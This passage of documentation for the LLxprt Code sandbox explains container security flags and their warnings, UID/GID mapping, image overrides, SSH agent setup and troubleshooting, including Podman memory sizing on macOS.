(`--cap-drop=ALL` and `--security-opt no-new-privileges`) and survive into the
container argv, so they can extend or override the defaults:

```bash
# Applied after --cap-drop=ALL, so it appears later in the argv
export SANDBOX_FLAGS="--cap-add=NET_ADMIN"
```

> **Warning — `--cap-add` only widens the bounding set.** On Docker the image's
> non-root user receives an added capability only in the **bounding** set (the
> permitted/effective/ambient sets stay empty), and on the current-user path
> `su` clears effective/permitted/ambient capabilities on both runtimes. So
> `--cap-add` alone does **not** guarantee the final process actually holds the
> capability — that depends on the runtime and on whether the current-user `su`
> path is in use. The defaults drop all capabilities on purpose; only widen them
> when you understand the exposure, and remove `SANDBOX_FLAGS` afterward so the
> hardened default is restored. If a workflow genuinely needs elevated
> privileges, `--security-opt no-new-privileges=false` and `--privileged` exist
> as explicit, security-reducing escape hatches.

> **Warning — `label=disable` turns off SELinux labelling.** The flag
> `--security-opt label=disable` removes the SELinux process label (MCS/MLS
> category) from the container, eliminating a mandatory-access-control boundary
> that confines what the container process can access. Treat it as a
> **last-resort** diagnostic step for SELinux permission denials, not a
> standing setting. After you identify and fix the underlying cause, remove
> `SANDBOX_FLAGS` so label enforcement is restored.

### UID/GID mapping (Linux)

By default on Debian and Ubuntu-based Linux, the container runs as your current
user UID/GID. To force this behavior on other distributions:

```bash
export SANDBOX_SET_UID_GID=true
```

### Override the sandbox image

```bash
export LLXPRT_SANDBOX_IMAGE=my-registry/my-sandbox:latest
```

## Troubleshooting

**Container not starting** — verify Docker or Podman is running: `docker info`
or `podman info`.

**Permission errors on mounted files** — on Linux, try `SANDBOX_SET_UID_GID=true`
first. The flag `--security-opt label=disable` (via `SANDBOX_FLAGS`) is a
**last resort** for SELinux systems: it turns off SELinux process labelling for
the container, removing a mandatory-access-control boundary. Use it only to
diagnose a SELinux denial, then remove it so label enforcement is restored.

**SSH not working in Podman on macOS** — use a stable socket path. The default
launchd socket paths are unreliable. Set up a dedicated socket:

```bash
ssh-agent -a ~/.llxprt/ssh-agent.sock
export SSH_AUTH_SOCK=~/.llxprt/ssh-agent.sock
ssh-add ~/.ssh/id_ed25519
llxprt --sandbox-engine podman --sandbox-profile-load dev
```

**SSH agent forwarded but git auth still fails** — the host agent may be running
with no identities loaded. Check with `ssh-add -l`; if it reports an empty
agent, load a key:

```bash
ssh-add ~/.ssh/id_ed25519
```

LLxprt Code prints a startup warning when it detects this empty-agent state.

**"socat not found" error** — the sandbox container image needs `socat` for SSH
agent and credential proxy tunneling. Use the official sandbox image.

**Network access denied** — check your profile's `network` setting. In container
mode `off` means `--network none`; under Seatbelt it selects the closed macOS
profile.

**"requires a non-empty LLXPRT_SANDBOX_PROXY_COMMAND"** — you set
`network: proxied` without supplying a proxy command. Set
`LLXPRT_SANDBOX_PROXY_COMMAND`, or change the profile to `on` or `off`.

**"macOS credential bridge requires container networking"** — you combined
`network: off` with Docker or Podman on macOS. The credential bridge needs
networking there. Use `network: on`, switch to Seatbelt, or run on Linux.

### Podman macOS: OOM-killed with exit code 137

On macOS, Podman runs containers inside a Linux VM. There are three separate
memory limits, and all three must be sized correctly:

1. **Podman machine VM memory** — the total memory allocated to the Podman VM.
   This is the hard ceiling for everything running inside the VM.
2. **Container memory limit** (`resources.memory` in a sandbox profile) — the
   per-container limit passed to the container runtime. You can set this higher
   than the VM memory, but the process will be OOM-killed when the VM runs out
   of memory first.
3. **Node.js heap limit** (`--max-old-space-size`) — automatically derived from
   the container memory limit when `ui.autoConfigureMaxOldSpaceSize` is enabled
   (the default).

If you set the container memory higher than the Podman VM memory, the container
starts but the process gets OOM-killed (exit code 137) as soon as it tries to
use more memory than the VM has available. LLxprt Code does not resize the
Podman machine VM.

**Check current VM memory** (output is in MiB, e.g., 8192 = 8 GiB):

```bash
podman machine inspect --format '{{.Resources.Memory}}'
```

**Resize VM memory** (use `podman machine ls` to find your machine name):

```bash
podman machine ls
podman machine stop <machine-name>
podman machine set --memory 16384 <machine-name>
podman machine start <machine-name>
```

**Sizing guidance:** Set VM memory higher than your container memory limit to
leave headroom for Podman VM overhead and any other processes running inside the
VM. For example, if your sandbox profile uses `"memory": "8g"`, set VM memory to
at least 10–12 GB.

## Related

- [Sandbox Profiles](./cli/sandbox-profiles.md) — full profile reference
- [Sandbox Setup Tutorial](./tutorials/sandbox-setup.md) — step-by-step walkthrough
- [Authentication](./cli/authentication.md) — credential setup
- [Profiles](./cli/profiles.md) — model and load balancer profiles (separate from sandbox profiles)
- [Provider Models and Limits](./providers/models-and-limits.md) — mutable model and pricing reference
